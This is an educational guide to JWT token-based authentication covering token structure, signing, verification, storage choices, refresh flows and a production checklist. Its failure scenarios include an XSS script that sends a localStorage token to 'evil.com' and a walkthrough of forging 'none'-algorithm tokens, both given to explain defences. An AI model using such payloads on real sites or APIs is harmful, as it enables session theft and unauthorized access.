# 03. Token-Based Authentication

## 1. Introduction

**Token-Based Authentication** is a **stateless** approach where the server issues a signed token (typically a **JWT** - JSON Web Token) to the client. The client stores this token (localStorage or memory) and sends it in the `Authorization` header for subsequent requests.

**Key Characteristic**: **Stateless**. The server validates the token's signature mathematically. It does *not* need to check a database to know "who is this?". The token *is* the session.

**Why Use It**:
- **Scalability**: No session store lookup required.
- **Cross-Domain**: Works easily across different domains (CORS friendly).
- **Mobile/API**: Standard for modern mobile apps and REST/GraphQL APIs.

---

## 2. Core Architecture

```mermaid
graph TD
    Client["Client (SPA/Mobile)"]
    AuthServer["Auth Server"]
    Resource["Resource Server (API)"]
    
    Client -->|"1. Login"| AuthServer
    AuthServer -->|"2. Verify & Sign JWT (Private Key)"| AuthServer
    AuthServer -->|"3. Return JWT"| Client
    
    Client -->|"4. Request + Header: Bearer <token>"| Resource
    Resource -->|"5. Verify Signature (Public Key)"| Resource
    Resource -->|"6. Data"| Client
```

### Components
1.  **Access Token (JWT)**: Short-lived, contains claims (user_id, roles). Used to access resources.
2.  **Refresh Token**: Long-lived, opaque string. Used to get new Access Tokens.
3.  **Signing Key**: Secret (HMAC) or Private Key (RSA/ECDSA) used to sign tokens.

---

## 3. Understanding JWT: The Token at Byte Level

### What IS a Token? (Simple Analogy)

Think of a JWT like a **concert wristband**:
- **Visible information**: Color shows which tier you're in (VIP, General Admission)
- **Hidden security**: Special ink or hologram that venue staff can verify
- **Self-contained**: Staff don't need to check a database, they just verify the wristband
- **Tamper-evident**: If you try to change the color, the security feature breaks

A JWT works the same way:
- **Visible data** (header + payload): Who you are, what you can do
- **Hidden security** (signature): Cryptographic proof it's authentic
- **Self-contained**: No database lookup needed
- **Tamper-evident**: Change one character, signature becomes invalid

---

### The Three-Part Structure

A JWT consists of three parts separated by dots:

```
Header.Payload.Signature
```

Each part serves a specific purpose and is encoded independently.

---

### Part 1: The Header (Algorithm Declaration)

The header tells the server **how to verify** the signature.

**Raw JSON:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Purpose:**
- `alg`: Algorithm used to create the signature (HMAC-SHA256)
- `typ`: Token type (always "JWT" for JSON Web Tokens)

**Why this matters:**
- Server must know the algorithm **before** attempting verification
- Algorithm confusion attacks exploit servers that don't validate this field
- Different algorithms have different security properties (more on this later)

---

### Part 2: The Payload (The Actual Data)

The payload contains **claims** - statements about the user and metadata.

**Raw JSON:**
```json
{
  "sub": "user123",
  "name": "Alice",
  "role": "admin",
  "iat": 1516239022,
  "exp": 1516239922
}
```

**Standard Claims:**
- `sub` (subject): User identifier
- `iat` (issued at): When token was created (Unix timestamp)
- `exp` (expires): When token becomes invalid (Unix timestamp)
- `iss` (issuer): Who created this token
- `aud` (audience): Who this token is intended for

**Custom Claims:**
- `name`, `role`, `email`: Application-specific data

**Critical Security Point:**
This data is **NOT encrypted**. Anyone who receives the token can decode the payload and read it. Think of it like a **clear plastic bag** - you can see what's inside, but you can't tamper with it without breaking the seal (signature).

---

### Part 3: The Signature (Tamper-Proof Seal)

The signature is mathematical proof that the token hasn't been modified.

**How it's created (HMAC-SHA256 example):**

```javascript
// Server has a secret key (256-bit random string)
const secret = "your-256-bit-secret"

// Step 1: Base64-encode header and payload
const encodedHeader = base64UrlEncode(header)    // "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
const encodedPayload = base64UrlEncode(payload)   // "eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkFsaWNlIn0"

// Step 2: Concatenate with dot
const message = encodedHeader + "." + encodedPayload

// Step 3: Create HMAC signature
const signature = HMAC_SHA256(message, secret)

// Step 4: Base64-encode signature
const encodedSignature = base64UrlEncode(signature)  // "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
```

**Final JWT:**
```
eyJhbGciOiJI...  .  eyJzdWIiOiJ1...  .  SflKxwRJSMeK...
```

**Why HMAC?**
- HMAC (Hash-based Message Authentication Code) creates a unique fingerprint of the data + secret
- Changing even one character in the payload produces a completely different signature
- Without the secret key, you cannot create a valid signature

---

### Why Base64? (Not Plain JSON)

You might wonder: **Why encode with Base64? Why not just send JSON?**

**The Problem with Raw JSON:**
```
{"alg":"HS256"}.{"sub":"user123"}.SIGNATURE_BYTES
```

This fails because:
1. **Dots in data**: What if your name is "Alice.Smith"? Ambiguous!
2. **Special characters**: JSON has quotes, braces, colons
3. **Binary signature**: Signature is raw bytes (not text)
4. **URL-unsafe**: Tokens go in URLs and HTTP headers

**The Solution: Base64URL Encoding**

Base64 converts **any bytes** (including binary) into **URL-safe text**:

```
Input bytes:  [123, 34, 97, 108, 103, 34, ...]
Base64:       eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

**Benefits:**
- ✅ No special characters (only: `A-Za-z0-9-_`)
- ✅ URL-safe (can be query parameter)
- ✅ HTTP header-safe (no quotes, spaces, newlines)
- ✅ Handles binary data (signature bytes)

**Security Note:**
Base64 is **encoding**, not **encryption**:
```javascript
// Anyone can decode it
atob("eyJzdWIiOiJ1c2VyMTIzIn0")  
// Output: {"sub":"user123"}
```

This is fine! The payload isn't secret - it's like your concert wristband color. The signature is what makes it secure.

---

### How Signature Verification Works

When an API receives a token, here's the verification process:

```mermaid
graph TB
    Start["Received JWT:<br/>eyJhbGc... . eyJzdWI... . SflKxw..."]
    
    Start --> Split["Split by '.'"]
    
    Split --> H["Header:<br/>eyJhbGc..."]
    Split --> P["Payload:<br/>eyJzdWI..."]
    Split --> S["Signature:<br/>SflKxw..."]
    
    H --> DecodeH["Decode Base64<br/>→ {alg: HS256}"]
    P --> DecodeP["Decode Base64<br/>→ {sub: user123}"]
    S --> DecodeS["Decode Base64<br/>→ [binary bytes]"]
    
    DecodeH --> CheckAlg{"Check<br/>algorithm"}
    
    CheckAlg -->|"alg === 'HS256'| Compute["Compute signature:<br/>HMAC(header+'.'+payload, secret)"]
    CheckAlg -->|"alg === 'none' or unknown"| Reject1["❌ REJECT"]
    
    Compute --> Compare{"Computed<br/>===<br/>Received?"}
    
    DecodeS --> Compare
    
    Compare -->|"Match"| CheckExp{"Check<br/>expiry"}
    Compare -->|"No Match"| Reject2["❌ REJECT<br/>(Tampered)"]
    
    CheckExp -->|"exp > now"| Accept["✅ ACCEPT<br/>Extract claims"]
    CheckExp -->|"exp <= now"| Reject3["❌ REJECT<br/>(Expired)"]
    
    style Accept fill:#c8e6c9
    style Reject1 fill:#ffcdd2
    style Reject2 fill:#ffcdd2
    style Reject3 fill:#ffcdd2
```

**Step-by-step:**

1. **Split token** by dots → 3 strings
2. **Decode header** from Base64 → Check algorithm is allowed
3. **Decode payload** from Base64 → Extract claims (sub, exp, etc.)
4. **Recompute signature** using the same algorithm and server's secret
5. **Compare** computed signature with received signature (byte-for-byte)
6. **Check expiry** (`exp` claim vs current time)
7. **Accept or reject** based on all checks

**Why this is fast:**
- No database lookup needed (stateless)
- HMAC-SHA256 verification: ~0.1-0.5ms
- RSA-SHA256 verification: ~0.5-2ms
- For 1000 requests/second: 0.5-2 seconds of CPU total

---

### The Complete JWT Creation Flow

Let's walk through an actual example:

**Step 1: User logs in**
```javascript
POST /login
{
  "username": "alice",
  "password": "correct_password"
}
```

**Step 2: Server verifies credentials**
```javascript
// Check database
const user = await db.findUserByUsername("alice")
if (bcrypt.compare(password, user.passwordHash)) {
  // Success! Create token
}
```

**Step 3: Server creates JWT**
```javascript
const header = {
  alg: "HS256",
  typ: "JWT"
}

const payload = {
  sub: user.id,              // "user123"
  name: user.name,           // "Alice"
  role: user.role,           // "admin"
  iat: Math.floor(Date.now() / 1000),      // 1516239022 (now)
  exp: Math.floor(Date.now() / 1000) + 900  // +15 minutes
}

const encodedHeader = base64UrlEncode(JSON.stringify(header))
// "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"

const encodedPayload = base64UrlEncode(JSON.stringify(payload))
// "eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzk5MjJ9"

const signature = HMAC_SHA256(
  encodedHeader + "." + encodedPayload,
  process.env.JWT_SECRET  // "your-256-bit-secret"
)

const encodedSignature = base64UrlEncode(signature)
// "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

const jwt = `${encodedHeader}.${encodedPayload}.${encodedSignature}`
```

**Step 4: Server returns JWT**
```javascript
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzk5MjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
  "token_type": "Bearer",
  "expires_in": 900
}
```

**Step 5: Client stores and uses token**
```javascript
// Store in memory
let accessToken = response.access_token

// Send with every request
fetch('/api/profile', {
  headers: {
    'Authorization': `Bearer ${accessToken}`
  }
})
```

---

### Visual: The Complete Token Structure

```mermaid
graph TB
    subgraph "JWT Token Anatomy"
        subgraph "Part 1: Header (Base64)"
            H1["Original JSON:<br/>{<br/>  alg: 'HS256',<br/>  typ: 'JWT'<br/>}"]
            H2["Base64 Encoded:<br/>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"]
            H1 --> H2
        end
        
        subgraph "Part 2: Payload (Base64)"
            P1["Original JSON:<br/>{<br/>  sub: 'user123',<br/>  name: 'Alice',<br/>  role: 'admin',<br/>  exp: 1516239922<br/>}"]
            P2["Base64 Encoded:<br/>eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNTE2MjM5OTIyfQ"]
            P1 --> P2
        end
        
        subgraph "Part 3: Signature (HMAC)"
            S1["Input:<br/>header.payload<br/>+<br/>secret key"]
            S2["HMAC-SHA256:<br/>[binary bytes]"]
            S3["Base64 Encoded:<br/>SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"]
            S1 --> S2 --> S3
        end
    end
    
    H2 --> Final["Final JWT Token:<br/><br/>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<br/>.<br/>eyJzdWIiOiJ1c2VyMTIzIi....<br/>.<br/>SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"]
    P2 --> Final
    S3 --> Final
    
    style H1 fill:#e6f3ff
    style H2 fill:#cce6ff
    style P1 fill:#fff3cd
    style P2 fill:#ffe6a0
    style S1 fill:#e6ffe6
    style S2 fill:#ccffcc
    style S3 fill:#b3ffb3
    style Final fill:#f0f0f0
```

---

### Why Dots?

You might wonder why use dots (`.`) as separators instead of other characters.

**Historical reason:** JWTs are designed for HTTP headers and URLs:
```
Authorization: Bearer eyJhbG...   ← Header
https://app.com/auth?token=eyJhbG...   ← URL
```

**Requirements:**
- Must be URL-safe (no encoding needed)
- Must not conflict with Base64URL alphabet (`A-Za-z0-9-_`)
- Must be easily split programmatically

**Dot (`.`) meets all criteria:**
- Not in Base64URL alphabet
- URL-safe (no encoding needed)
- Easy to split: `token.split('.')`

---

### Security Implications

**What attackers CAN do:**
- ✅ Decode and read the payload (it's just Base64)
- ✅ See your user ID, role, expiry time
- ✅ Know when your token expires

**What attackers CANNOT do (without the secret):**
- ❌ Modify the payload
- ❌ Change user ID or role
- ❌ Extend expiry time
- ❌ Create valid signatures

**Why?** The signature is cryptographically bound to the header + payload + secret. Change one bit, and the signature becomes invalid.

---

### The Refresh Flow

```mermaid
sequenceDiagram
    participant Client
    participant API
    participant AuthServer
    
    Client->>API: GET /data (Access Token)
    API-->>Client: 401 Unauthorized (Token expired)
    
    Client->>AuthServer: POST /refresh<br/>(Refresh Token in HttpOnly cookie)
    
    AuthServer->>AuthServer: Validate Refresh Token<br/>(Check DB for revocation)
    
    alt Refresh Token Valid
        AuthServer->>AuthServer: Generate new Access Token
        AuthServer-->>Client: {access_token: "eyJ..."}
        
        Client->>API: GET /data (New Access Token)
        API-->>Client: 200 OK (Data)
    else Refresh Token Invalid/Revoked
        AuthServer-->>Client: 401 Unauthorized
        Note over Client: Redirect to /login
    end
```

Since JWTs are stateless, we can't easily revoke them. Limitation: Short lifespans (e.g., 15 min).
To keep user logged in:
1.  Access Token expires (401 Unauthorized).
2.  Client sends **Refresh Token** to Auth Server.
3.  Auth Server checks DB (Refresh token *is* stateful/revocable).
4.  Auth Server issues new Access Token.

---

## 4. Deep Dive: Storage Options

Where should the frontend store the token?

| Storage | XSS Vulnerable? | CSRF Vulnerable? | Recommendation |
| :--- | :--- | :--- | :--- |
| **LocalStorage** | **YES** (JS can read it) | No (Header auth) | ⚠️ Common but risky. Okay for low stakes. |
| **HttpOnly Cookie** | No (JS can't read) | **YES** (Auto-sent) | ✅ Safer, but requires CSRF protection. |
| **In-Memory** | No | No | ✅ Safest. Token lost on refresh. Use silent refresh via cookie to restore. |

**Best Practice**: Store **Refresh Token** in an `HttpOnly` cookie and the **Access Token** in memory (JavaScript variable).

---

## 5. End-to-End Walkthrough: API Request

Scenario: Mobile app fetching user profile.

```mermaid
sequenceDiagram
    participant App
    participant API_Gateway
    participant Service
    
    App->>API_Gateway: GET /profile <br/> Authorization: Bearer eyJhbG...
    
    Note over API_Gateway: 1. Parse JWT
    Note over API_Gateway: 2. Check Expiry (exp)
    Note over API_Gateway: 3. Verify Signature
    
    alt Signature Valid
        API_Gateway->>Service: Forward Request (User ID: 123)
        Service-->>API_Gateway: Profile Data
        API_Gateway-->>App: 200 OK
    else Signature Invalid / Expired
        API_Gateway-->>App: 401 Unauthorized
        Note left of App: Client must attempt Refresh Flow
    end
```

---

## 6. Failure Scenarios

### Scenario A: Token Theft (XSS)
**Symptom**: Attacker gains unauthorized access to user account.
**Cause**: Malicious JavaScript injected into page reads token from localStorage.
**Mechanism**: XSS vulnerability allows attacker to execute arbitrary JavaScript.

```mermaid
sequenceDiagram
    participant Attacker
    participant Victim
    participant App
    participant AttackerServer
    
    Attacker->>App: Inject malicious script<br/>(via comment, profile, etc.)
    
    Victim->>App: Visit page with XSS
    
    rect rgb(255, 200, 200)
        App-->>Victim: HTML + Malicious Script<br/><script>fetch('evil.com?token='+localStorage.getItem('jwt'))</script>
    end
    
    Note over Victim: Browser executes script
    
    Victim->>Victim: localStorage.getItem('jwt')
    Victim->>AttackerServer: GET evil.com?token=eyJhbG...
    
    AttackerServer-->>Attacker: Stolen JWT
    
    Attacker->>App: GET /api/account<br/>Authorization: Bearer eyJhbG...
    
    rect rgb(255, 200, 200)
        App-->>Attacker: Victim's data ❌
        Note over Attacker: Full access until token expires (15 min)
    end
```

**The Fix**:
- **HttpOnly Cookies**: Store tokens where JS cannot access
- **Content Security Policy**: `Content-Security-Policy: script-src 'self'`
- **Input Sanitization**: Escape all user-generated content
- **In-Memory Storage**: Store access token in JS variable (lost on refresh)
- **Short Expiry**: 900s (15 min) limits damage window

---

### Scenario B: The "Forever" Token (Revocation Problem)
**Symptom**: Banned user continues accessing API for hours.
**Cause**: JWT validation is purely mathematical (no DB check).
**Mechanism**: Once issued, token is valid until expiry regardless of user status changes.

```mermaid
sequenceDiagram
    participant Admin
    participant User
    participant API
    participant AuthServer
    
    Note over User: User has valid JWT<br/>Expires in 24 hours
    
    User->>API: GET /data (JWT)
    API->>API: Verify signature (valid)
    API-->>User: 200 OK
    
    rect rgb(255, 220, 200)
        Note over Admin: Hour 1: Admin bans user
        Admin->>AuthServer: Ban user_id=123
        AuthServer->>AuthServer: Update DB: banned=true
    end
    
    User->>API: GET /data (Same JWT)
    
    rect rgb(255, 200, 200)
        API->>API: Verify signature (still valid!)
        Note over API: No DB check<br/>Token not expired
        API-->>User: 200 OK ❌
    end
    
    Note over User: User continues access for 23 more hours
```

**The Fix**:
- **Short Access Tokens**: 900s (15 min) instead of 86400s (24h)
- **Refresh Token Revocation**: Check DB during refresh (stateful step)
- **Token Blacklist**: Maintain Redis set of revoked JTIs (defeats stateless benefit)
- **Version Claims**: Include `token_version` in JWT, increment on ban
- **Hybrid Approach**: Cache user status in API gateway (5-min TTL)

---

### Scenario C: Algorithm Confusion ("none" Algorithm)
**Symptom**: Unsigned tokens accepted as valid.
**Cause**: Server doesn't validate the `alg` field in JWT header.
**Mechanism**: Attacker changes algorithm to "none" and removes signature.

```mermaid
sequenceDiagram
    participant Attacker
    participant API
    
    Note over Attacker: Attacker has expired/invalid JWT<br/>eyJhbGc6IkhTMjU2In0.eyJzdWI6IjEyMyJ9.signature
    
    rect rgb(255, 220, 200)
        Attacker->>Attacker: Modify Header<br/>{"alg": "none", "typ": "JWT"}
        Attacker->>Attacker: Modify Payload<br/>{"sub": "admin", "role": "superuser"}
        Attacker->>Attacker: Remove Signature<br/>eyJhbGc6Im5vbmUifQ.eyJzdWI6ImFkbWluIn0.
    end
    
    Attacker->>API: GET /admin<br/>Authorization: Bearer eyJhbGc6Im5vbmUifQ...
    
    rect rgb(255, 200, 200)
        API->>API: Parse JWT
        API->>API: Check alg: "none"<br/>BUG: Accepts "none" algorithm!
        API->>API: Skip signature verification
        API-->>Attacker: 200 OK (Admin access) ❌
    end
```

**The Fix**:
- **Whitelist Algorithms**: `if (alg !== 'RS256') throw Error('Invalid algorithm')`
- **Reject "none"**: Explicitly check `if (alg === 'none') throw Error()`
- **Library Configuration**: Use strict mode in JWT libraries
- **Code Review**: Never use `verify(token, null)` or similar patterns
- **Testing**: Add security tests for algorithm confusion attacks

---

## 7. Performance Tuning

| Configuration | Default | Recommended | Impact |
| :--- | :--- | :--- | :--- |
| **Algorithm** | HS256 | **RS256** (RSA) | RS256: ~0.5ms verification. Auth Server signs (Private), APIs verify (Public). |
| **Token Size** | - | 800-2000 bytes | Typical JWT (Base64): 1.2KB. Large tokens = bandwidth cost on every request. |
| **Access Expiry** | 60m | **900s (15m)** | Shorter window of vulnerability if stolen. Balance with refresh frequency. |
| **Refresh Expiry** | 30d | **604800s (7d)** | Sliding window. Balance between security and UX. |
| **HS256 Verification** | - | ~0.1ms | Fast but requires shared secret across all services. |
| **RS256 Verification** | - | ~0.5ms | Slightly slower but better security model (public key distribution). |

---

## 8. Constraints & Limitations

| Constraint | Limit | Why? |
| :--- | :--- | :--- |
| **Revocation** | Impossible | By design. To revoke immediately, you must introduce state (blacklist), defeating the purpose. |
| **Payload Size** | ~8KB (Header limit) | Servers reject large headers. Don't put permissions lists in JWT. |
| **Visibility** | Public | Do NOT put PII (email, SSN) in payload unless encrypted (JWE). |

---

## 9. When to Use?

| Use Case | Verdict | Why? |
| :--- | :--- | :--- |
| **Microservices** | ✅ **BEST CHOICE** | Services verify tokens (CPU only) without pounding a central Login DB. |
| **Mobile Apps** | ✅ **YES** | Easy to handle headers. Persistent login via Refresh Tokens. |
| **Public APIs** | ✅ **YES** | Standard way developers consume APIs. |
| **Simple Monolith** | ❌ **NO** | Session/Cookie covers this better and is more secure by default. |

---

## 10. Production Checklist

1.  [ ] **HTTPS Only**: Tokens are equivalent to passwords. Encrypt the transport.
2.  [ ] **Strong Secret**: If using HS256, secret must be 32+ random characters.
3.  [ ] **Validate Algorithm**: Whitelist allowed algorithms (e.g., only `RS256`).
4.  [ ] **Verify Audience (aud)**: Ensure token was meant for *your* API.
5.  [ ] **Verify Issuer (iss)**: Ensure token came from a trusted Auth Server.
6.  [ ] **Short Access Tokens**: Keep them < 15 minutes.
7.  [ ] **Secure Refresh Storage**: Ideally HttpOnly cookies with `path=/refresh`.
8.  [ ] **Logging**: Never log the token string.
9.  [ ] **JTI Check**: (Optional) Use JWT ID to prevent replay if creating one-time tokens.
10. [ ] **Library**: Use a mature JWT library, don't write your own crypto/verification logic.
